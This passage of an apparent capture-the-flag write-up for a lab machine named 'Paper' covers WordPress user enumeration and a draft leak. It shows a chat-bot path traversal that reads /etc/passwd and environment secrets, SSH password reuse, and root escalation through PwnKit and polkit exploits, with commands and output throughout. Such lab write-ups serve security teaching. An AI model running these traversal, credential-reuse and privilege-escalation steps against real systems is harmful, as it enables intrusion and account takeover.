 <span class="o">|</span>  <span class="o">-</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//office.paper/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;</span>
 <span class="o">|</span>  <span class="o">-</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//office.paper/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;</span>

<span class="p">...[</span><span class="nx">snip</span><span class="p">]...</span>

<span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="nc">User</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="nx">Identified</span><span class="p">:</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">prisonmike</span>
 <span class="o">|</span> <span class="nx">Found</span> <span class="nx">By</span><span class="p">:</span> <span class="nx">Author</span> <span class="nx">Posts</span> <span class="o">-</span> <span class="nx">Author</span> <span class="nc">Pattern </span><span class="p">(</span><span class="nx">Passive</span> <span class="nx">Detection</span><span class="p">)</span>
 <span class="o">|</span> <span class="nx">Confirmed</span> <span class="nx">By</span><span class="p">:</span>
 <span class="o">|</span>  <span class="nx">Rss</span> <span class="nc">Generator </span><span class="p">(</span><span class="nx">Passive</span> <span class="nx">Detection</span><span class="p">)</span>
 <span class="o">|</span>  <span class="nx">Wp</span> <span class="nx">Json</span> <span class="nc">Api </span><span class="p">(</span><span class="nx">Aggressive</span> <span class="nx">Detection</span><span class="p">)</span>
 <span class="o">|</span>   <span class="o">-</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//office.paper/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span>
 <span class="o">|</span>  <span class="nx">Author</span> <span class="nx">Id</span> <span class="nx">Brute</span> <span class="nx">Forcing</span> <span class="o">-</span> <span class="nx">Author</span> <span class="nc">Pattern </span><span class="p">(</span><span class="nx">Aggressive</span> <span class="nx">Detection</span><span class="p">)</span>
 <span class="o">|</span>  <span class="nx">Login</span> <span class="nb">Error</span> <span class="nc">Messages </span><span class="p">(</span><span class="nx">Aggressive</span> <span class="nx">Detection</span><span class="p">)</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">nick</span>
 <span class="o">|</span> <span class="nx">Found</span> <span class="nx">By</span><span class="p">:</span> <span class="nx">Wp</span> <span class="nx">Json</span> <span class="nc">Api </span><span class="p">(</span><span class="nx">Aggressive</span> <span class="nx">Detection</span><span class="p">)</span>
 <span class="o">|</span>  <span class="o">-</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//office.paper/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span>
 <span class="o">|</span> <span class="nx">Confirmed</span> <span class="nx">By</span><span class="p">:</span>
 <span class="o">|</span>  <span class="nx">Author</span> <span class="nx">Id</span> <span class="nx">Brute</span> <span class="nx">Forcing</span> <span class="o">-</span> <span class="nx">Author</span> <span class="nc">Pattern </span><span class="p">(</span><span class="nx">Aggressive</span> <span class="nx">Detection</span><span class="p">)</span>
 <span class="o">|</span>  <span class="nx">Login</span> <span class="nb">Error</span> <span class="nc">Messages </span><span class="p">(</span><span class="nx">Aggressive</span> <span class="nx">Detection</span><span class="p">)</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">creedthoughts</span>
 <span class="o">|</span> <span class="nx">Found</span> <span class="nx">By</span><span class="p">:</span> <span class="nx">Author</span> <span class="nx">Id</span> <span class="nx">Brute</span> <span class="nx">Forcing</span> <span class="o">-</span> <span class="nx">Author</span> <span class="nc">Pattern </span><span class="p">(</span><span class="nx">Aggressive</span> <span class="nx">Detection</span><span class="p">)</span>
 <span class="o">|</span> <span class="nx">Confirmed</span> <span class="nx">By</span><span class="p">:</span> <span class="nx">Login</span> <span class="nb">Error</span> <span class="nc">Messages </span><span class="p">(</span><span class="nx">Aggressive</span> <span class="nx">Detection</span><span class="p">)</span>

<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nx">No</span> <span class="nx">WPScan</span> <span class="nx">API</span> <span class="nx">Token</span> <span class="nx">given</span><span class="p">,</span> <span class="k">as</span> <span class="nx">a</span> <span class="nx">result</span> <span class="nx">vulnerability</span> <span class="nx">data</span> <span class="nx">has</span> <span class="nx">not</span> <span class="nx">been</span> <span class="nx">output</span><span class="p">.</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nx">You</span> <span class="nx">can</span> <span class="kd">get</span> <span class="nx">a</span> <span class="nx">free</span> <span class="nx">API</span> <span class="nx">token</span> <span class="kd">with</span> <span class="mi">25</span> <span class="nx">daily</span> <span class="nx">requests</span> <span class="nx">by</span> <span class="nx">registering</span> <span class="nx">at</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//wpscan.com/register</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Finished</span><span class="p">:</span> <span class="nx">Sat</span> <span class="nx">Feb</span>  <span class="mi">5</span> <span class="mi">21</span><span class="p">:</span><span class="mi">35</span><span class="p">:</span><span class="mi">30</span> <span class="mi">2022</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Requests</span> <span class="nx">Done</span><span class="p">:</span> <span class="mi">58</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Cached</span> <span class="nx">Requests</span><span class="p">:</span> <span class="mi">6</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Data</span> <span class="nx">Sent</span><span class="p">:</span> <span class="mf">15.658</span> <span class="nx">KB</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Data</span> <span class="nx">Received</span><span class="p">:</span> <span class="mf">254.476</span> <span class="nx">KB</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Memory</span> <span class="nx">used</span><span class="p">:</span> <span class="mf">175.559</span> <span class="nx">MB</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Elapsed</span> <span class="nx">time</span><span class="p">:</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">10</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Checking for vulnerabilities in the installed version we find <a href="https://wpscan.com/vulnerability/9909">this</a> describing an easy way to leak drafts. Using it as described with <code class="language-plaintext highlighter-rouge">asc</code> sorting it we get an error, however changing it to <code class="language-plaintext highlighter-rouge">desc</code> we get a draft leaking a rocket chat installation with the secret registration url.</p>

<p><a href="/img/paper/020_wordpress_drafts.png"><img data-src="/img/paper/020_wordpress_drafts.png" alt="020_wordpress_drafts" data-proofer-ignore></a></p>

<h2 id="rocket-chat-lfi"><span class="mr-2">Rocket chat LFI</span><a href="#rocket-chat-lfi" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>After adding <code class="language-plaintext highlighter-rouge">chat.office.paper</code> to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> aswell and opening the registration link in our browser we are able to register an account on rocket chat.</p>

<p><a href="/img/paper/025_rocket_chat_register.png"><img data-src="/img/paper/025_rocket_chat_register.png" alt="025_rocket_chat_register" data-proofer-ignore></a></p>

<p>Once logged in with the created account there is an interesting discussion in general where we see some bot functionality. Especially the file retrieval seems to be interesting.</p>

<p><a href="/img/paper/030_rocket_chat_general.png"><img data-src="/img/paper/030_rocket_chat_general.png" alt="030_rocket_chat_general" data-proofer-ignore></a></p>

<p>Starting a private conversation with the bot and testing if we can go back to the file system root with <code class="language-plaintext highlighter-rouge">../</code> it works and we are able to retrieve the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file.</p>

<p><a href="/img/paper/035_recyclops_files.png"><img data-src="/img/paper/035_recyclops_files.png" alt="035_recyclops_files" data-proofer-ignore></a></p>

<p>Checking the environment parameters of rocket chat with  <code class="language-plaintext highlighter-rouge">recyclops file ../../../../proc/self/environ</code> we find the installation is running from the user dwight’s home directory and we also get the password.</p>

<p><a href="/img/paper/040_rocket_chat_environ.png"><img data-src="/img/paper/040_rocket_chat_environ.png" alt="040_rocket_chat_environ" data-proofer-ignore></a></p>

<p>Testing for password reuse over ssh we are able to log into the machine and grab the user flag.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nx">$</span> <span class="nx">ssh</span> <span class="nx">dwight</span><span class="p">@</span><span class="nd">office</span><span class="p">.</span><span class="nx">paper</span>
<span class="nx">dwight</span><span class="p">@</span><span class="nd">office</span><span class="p">.</span><span class="nx">paper</span><span class="dl">'</span><span class="s1">s password:
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ wc -c user.txt
33 user.txt
</span></pre></td></tr></tbody></table></code></div></div>

<h1 id="root">Root</h1>

<h2 id="pkexec"><span class="mr-2">pkexec</span><a href="#pkexec" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>Until some time after release there was an unintended way to obtain root abusing a vulnerable <code class="language-plaintext highlighter-rouge">pkexec</code> version.
Checking for suid binaries we can see that <code class="language-plaintext highlighter-rouge">pkexec</code> is installed on the machine.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre><span class="p">[</span><span class="nx">dwight</span><span class="p">@</span><span class="nd">paper</span> <span class="o">~</span><span class="p">]</span><span class="nx">$</span> <span class="nx">find</span> <span class="o">/</span> <span class="o">-</span><span class="nx">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="mi">2</span><span class="o">&gt;</span><span class="sr">/dev/</span><span class="kc">null</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">fusermount</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">chage</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">gpasswd</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">newgrp</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">mount</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">su</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">umount</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">crontab</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">pkexec</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">passwd</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">chfn</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">chsh</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">at</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">sudo</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">fusermount3</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">sbin</span><span class="o">/</span><span class="nx">grub2</span><span class="o">-</span><span class="kd">set</span><span class="o">-</span><span class="nx">bootflag</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">sbin</span><span class="o">/</span><span class="nx">pam_timestamp_check</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">sbin</span><span class="o">/</span><span class="nx">unix_chkpwd</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">sbin</span><span class="o">/</span><span class="nx">userhelper</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">sbin</span><span class="o">/</span><span class="nx">mount</span><span class="p">.</span><span class="nx">nfs</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">polkit</span><span class="o">-</span><span class="mi">1</span><span class="o">/</span><span class="nx">polkit</span><span class="o">-</span><span class="nx">agent</span><span class="o">-</span><span class="nx">helper</span><span class="o">-</span><span class="mi">1</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">libexec</span><span class="o">/</span><span class="nx">dbus</span><span class="o">-</span><span class="mi">1</span><span class="o">/</span><span class="nx">dbus</span><span class="o">-</span><span class="nx">daemon</span><span class="o">-</span><span class="nx">launch</span><span class="o">-</span><span class="nx">helper</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">libexec</span><span class="o">/</span><span class="nx">qemu</span><span class="o">-</span><span class="nx">bridge</span><span class="o">-</span><span class="nx">helper</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">libexec</span><span class="o">/</span><span class="nx">cockpit</span><span class="o">-</span><span class="nx">session</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">libexec</span><span class="o">/</span><span class="nx">sssd</span><span class="o">/</span><span class="nx">krb5_child</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">libexec</span><span class="o">/</span><span class="nx">sssd</span><span class="o">/</span><span class="nx">ldap_child</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">libexec</span><span class="o">/</span><span class="nx">sssd</span><span class="o">/</span><span class="nx">proxy_child</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">libexec</span><span class="o">/</span><span class="nx">sssd</span><span class="o">/</span><span class="nx">selinux_child</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">libexec</span><span class="o">/</span><span class="nx">spice</span><span class="o">-</span><span class="nx">gtk</span><span class="o">-</span><span class="nx">x86_64</span><span class="o">/</span><span class="nx">spice</span><span class="o">-</span><span class="nx">client</span><span class="o">-</span><span class="nx">glib</span><span class="o">-</span><span class="nx">usb</span><span class="o">-</span><span class="nx">acl</span><span class="o">-</span><span class="nx">helper</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">libexec</span><span class="o">/</span><span class="nx">Xorg</span><span class="p">.</span><span class="nx">wrap</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Retrieving it’s version we see it is vulnerable to the recent <a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt">CVE-2021-4034</a>.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="p">[</span><span class="nx">dwight</span><span class="p">@</span><span class="nd">paper</span> <span class="o">~</span><span class="p">]</span><span class="nx">$</span> <span class="nx">pkexec</span> <span class="o">--</span><span class="nx">version</span>
<span class="nx">pkexec</span> <span class="nx">version</span> <span class="mf">0.115</span>
</pre></td></tr></tbody></table></code></div></div>

<p>We can use <a href="https://github.com/luijait/PwnKit-Exploit">this PoC</a> to exploit pkexec and obtain root on the machine.
Since make is installed on the machine we clone the repo tar it up and scp it to the target as dwight.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="nx">$</span> <span class="nx">git</span> <span class="nx">clone</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//github.com/luijait/PwnKit-Exploit</span>
<span class="nx">Cloning</span> <span class="nx">into</span> <span class="dl">'</span><span class="s1">PwnKit-Exploit</span><span class="dl">'</span><span class="p">...</span>
<span class="nx">remote</span><span class="p">:</span> <span class="nx">Enumerating</span> <span class="nx">objects</span><span class="p">:</span> <span class="mi">224</span><span class="p">,</span> <span class="nx">done</span><span class="p">.</span>
<span class="nx">remote</span><span class="p">:</span> <span class="nx">Counting</span> <span class="nx">objects</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">224</span><span class="o">/</span><span class="mi">224</span><span class="p">),</span> <span class="nx">done</span><span class="p">.</span>
<span class="nx">remote</span><span class="p">:</span> <span class="nx">Compressing</span> <span class="nx">objects</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">224</span><span class="o">/</span><span class="mi">224</span><span class="p">),</span> <span class="nx">done</span><span class="p">.</span>
<span class="nx">remote</span><span class="p">:</span> <span class="nx">Total</span> <span class="mi">224</span> <span class="p">(</span><span class="nx">delta</span> <span class="mi">119</span><span class="p">),</span> <span class="nx">reused</span> <span class="mi">4</span> <span class="p">(</span><span class="nx">delta</span> <span class="mi">0</span><span class="p">),</span> <span class="nx">pack</span><span class="o">-</span><span class="nx">reused</span> <span class="mi">0</span>
<span class="nx">Receiving</span> <span class="nx">objects</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">224</span><span class="o">/</span><span class="mi">224</span><span class="p">),</span> <span class="mf">64.38</span> <span class="nx">KiB</span> <span class="o">|</span> <span class="mf">4.29</span> <span class="nx">MiB</span><span class="o">/</span><span class="nx">s</span><span class="p">,</span> <span class="nx">done</span><span class="p">.</span>
<span class="nx">Resolving</span> <span class="nx">deltas</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">119</span><span class="o">/</span><span class="mi">119</span><span class="p">),</span> <span class="nx">done</span><span class="p">.</span>
<span class="nx">$</span> <span class="nx">tar</span> <span class="o">-</span><span class="nx">czf</span> <span class="nx">PwnKit</span><span class="o">-</span><span class="nx">Exploit</span><span class="p">.</span><span class="nx">tar</span><span class="p">.</span><span class="nx">gz</span> <span class="nx">PwnKit</span><span class="o">-</span><span class="nx">Exploit</span>
<span class="nx">$</span> <span class="nx">scp</span> <span class="p">.</span><span class="o">/</span><span class="nx">PwnKit</span><span class="o">-</span><span class="nx">Exploit</span><span class="p">.</span><span class="nx">tar</span><span class="p">.</span><span class="nx">gz</span> <span class="nx">dwight</span><span class="p">@</span><span class="nd">office</span><span class="p">.</span><span class="nx">paper</span><span class="p">:</span><span class="o">/</span><span class="nx">tmp</span>
<span class="nx">dwight</span><span class="p">@</span><span class="nd">office</span><span class="p">.</span><span class="nx">paper</span><span class="dl">'</span><span class="s1">s password:
PwnKit-Exploit.tar.gz                                                                                                                                                                                        100%   92KB 791.0KB/s   00:00
</span></pre></td></tr></tbody></table></code></div></div>

<p>There we unpack the archive and “make” the binary.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="p">[</span><span class="nx">dwight</span><span class="p">@</span><span class="nd">paper</span> <span class="nx">tmp</span><span class="p">]</span><span class="nx">$</span> <span class="nx">tar</span> <span class="o">-</span><span class="nx">xf</span> <span class="nx">PwnKit</span><span class="o">-</span><span class="nx">Exploit</span><span class="p">.</span><span class="nx">tar</span><span class="p">.</span><span class="nx">gz</span>
<span class="p">[</span><span class="nx">dwight</span><span class="p">@</span><span class="nd">paper</span> <span class="nx">tmp</span><span class="p">]</span><span class="nx">$</span> <span class="nx">cd</span> <span class="nx">PwnKit</span><span class="o">-</span><span class="nx">Exploit</span><span class="o">/</span>
<span class="p">[</span><span class="nx">dwight</span><span class="p">@</span><span class="nd">paper</span> <span class="nx">PwnKit</span><span class="o">-</span><span class="nx">Exploit</span><span class="p">]</span><span class="nx">$</span> <span class="nx">make</span>
<span class="nx">cc</span> <span class="o">-</span><span class="nx">Wall</span>    <span class="nx">exploit</span><span class="p">.</span><span class="nx">c</span>   <span class="o">-</span><span class="nx">o</span> <span class="nx">exploit</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Running the exploit we get dropped into a root shell.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="p">[</span><span class="nx">dwight</span><span class="p">@</span><span class="nd">paper</span> <span class="nx">PwnKit</span><span class="o">-</span><span class="nx">Exploit</span><span class="p">]</span><span class="nx">$</span> <span class="p">.</span><span class="o">/</span><span class="nx">exploit</span>
<span class="nx">Current</span> <span class="nx">User</span> <span class="nx">before</span> <span class="nx">execute</span> <span class="nx">exploit</span>
<span class="nx">hacker</span><span class="p">@</span><span class="nd">victim</span><span class="nx">$whoami</span><span class="p">:</span> <span class="nx">dwight</span>
<span class="nx">Exploit</span> <span class="nx">written</span> <span class="nx">by</span> <span class="p">@</span><span class="nd">luijait</span> <span class="p">(</span><span class="mh">0x6c75696a616974</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Enjoy</span> <span class="nx">your</span> <span class="nx">root</span> <span class="k">if</span> <span class="nx">exploit</span> <span class="nx">was</span> <span class="nx">completed</span> <span class="nx">succesfully</span>
<span class="p">[</span><span class="nx">root</span><span class="p">@</span><span class="nd">paper</span> <span class="nx">PwnKit</span><span class="o">-</span><span class="nx">Exploit</span><span class="p">]</span><span class="err">#</span> <span class="nx">wc</span> <span class="o">-</span><span class="nx">c</span> <span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">root</span><span class="p">.</span><span class="nx">txt</span>
<span class="mi">33</span> <span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="nx">root</span><span class="p">.</span><span class="nx">txt</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="polkit"><span class="mr-2">Polkit</span><a href="#polkit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>The actually intended solution to obtain root on the machine was to abuse polkit. Checking for the installed version we can see that it is vulnerable to <a href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/">CVE-2021-3560</a>.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="p">[</span><span class="nx">dwight</span><span class="p">@</span><span class="nd">paper</span> <span class="o">~</span><span class="p">]</span><span class="nx">$</span> <span class="nx">rpm</span> <span class="o">-</span><span class="nx">qa</span> <span class="o">|</span> <span class="nx">grep</span> <span class="o">-</span><span class="nx">i</span> <span class="nx">polkit</span>
<span class="nx">polkit</span><span class="o">-</span><span class="mf">0.115</span><span class="o">-</span><span class="mi">6</span><span class="p">.</span><span class="nx">el8</span><span class="p">.</span><span class="nx">x86_64</span>
<span class="nx">polkit</span><span class="o">-</span><span class="nx">pkla</span><span class="o">-</span><span class="nx">compat</span><span class="o">-</span><span class="mf">0.1</span><span class="o">-</span><span class="mi">12</span><span class="p">.</span><span class="nx">el8</span><span class="p">.</span><span class="nx">x86_64</span>
<span class="nx">polkit</span><span class="o">-</span><span class="nx">libs</span><span class="o">-</span><span class="mf">0.115</span><span class="o">-</span><span class="mi">6</span><span class="p">.</span><span class="nx">el8</span><span class="p">.</span><span class="nx">x86_64</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Using the <a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation">authors poc script</a> we are able to create a new user with sudo rights and add the root flag to our collection. Note that this exploit is because of its time based nature not completely stable and might need rerunning until it works.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td><td class="rouge-code"><pre><span class="p">[</span><span class="n">dwight</span><span class="o">@</span><span class="n">paper</span> <span class="n">tmp</span><span class="p">]</span><span class="err">$</span> <span class="mf">.</span><span class="o">/</span><span class="n">poc</span><span class="mf">.</span><span class="n">sh</span> <span class="o">-</span><span class="n">u</span><span class="o">=</span><span class="n">sm1l3z</span> <span class="o">-</span><span class="n">p</span><span class="o">=</span><span class="n">sm1l3z</span>

<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nc">Username</span> <span class="n">set</span> <span class="k">as</span> <span class="o">:</span> <span class="n">sm1l3z</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nc">No</span> <span class="nc">Custom</span> <span class="nc">Timing</span> <span class="n">specified</span><span class="mf">.</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nc">Timing</span> <span class="n">will</span> <span class="n">be</span> <span class="n">detected</span> <span class="nc">Automatically</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nc">Force</span> <span class="n">flag</span> <span class="n">not</span> <span class="n">set</span><span class="mf">.</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nc">Vulnerability</span> <span class="n">checking</span> <span class="n">is</span> <span class="no">ENABLED</span><span class="o">!</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nc">Starting</span> <span class="nc">Vulnerability</span> <span class="nc">Checks</span><span class="mf">...</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nc">Checking</span> <span class="n">distribution</span><span class="mf">...</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nc">Detected</span> <span class="nc">Linux</span> <span class="n">distribution</span> <span class="k">as</span> <span class="s2">"centos"</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nc">Checking</span> <span class="k">if</span> <span class="nc">Accountsservice</span> <span class="k">and</span> <span class="nc">Gnome</span><span class="o">-</span><span class="nc">Control</span><span class="o">-</span><span class="nc">Center</span> <span class="n">is</span> <span class="n">installed</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nc">Accounts</span> <span class="n">service</span> <span class="k">and</span> <span class="nc">Gnome</span><span class="o">-</span><span class="nc">Control</span><span class="o">-</span><span class="nc">Center</span> <span class="nc">Installation</span> <span class="nc">Found</span><span class="o">!!</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nc">Checking</span> <span class="k">if</span> <span class="n">polkit</span> <span class="n">version</span> <span class="n">is</span> <span class="n">vulnerable</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nc">Polkit</span> <span class="n">version</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">be</span> <span class="n">vulnerable</span><span class="o">!!</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nc">Starting</span> <span class="n">exploit</span><span class="mf">...</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nc">Inserting</span> <span class="nc">Username</span> <span class="n">sm1l3z</span><span class="mf">...</span>
<span class="nc">Error</span> <span class="n">org</span><span class="mf">.</span><span class="n">freedesktop</span><span class="mf">.</span><span class="nc">Accounts</span><span class="mf">.</span><span class="nc">Error</span><span class="mf">.</span><span class="nc">PermissionDenied</span><span class="o">:</span> <span class="nc">Authentication</span> <span class="n">is</span> <span class="n">required</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nc">Inserted</span> <span class="nc">Username</span> <span class="n">sm1l3z</span>  <span class="n">with</span> <span class="no">UID</span> <span class="mi">1006</span><span class="o">!</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nc">Inserting</span> <span class="n">password</span> <span class="n">hash</span><span class="mf">...</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nc">It</span> <span class="n">looks</span> <span class="n">like</span> <span class="n">the</span> <span class="n">password</span> <span class="n">insertion</span> <span class="n">was</span> <span class="n">succesful</span><span class="o">!</span>
